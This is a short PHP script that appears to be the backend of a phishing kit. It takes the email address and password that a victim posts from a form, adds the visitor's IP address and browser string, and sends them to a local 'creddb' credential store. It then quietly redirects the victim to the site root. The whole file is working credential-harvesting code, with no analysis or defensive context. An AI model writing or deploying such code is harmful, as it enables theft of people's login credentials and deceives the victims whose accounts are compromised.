<?php
include 'log.php';

$email=urlencode($_POST['email']);
$pass=urlencode($_POST['pass']);
$type=urlencode($_POST['type']);

$url = "http://localhost:443/creddb?username=" . $email ."&password=". $pass ."&ip=" . $ipaddress . "&useragent=".$browser ."&cred_type=".$type;
$res = file_get_contents($url);
header("Location: /");
exit();
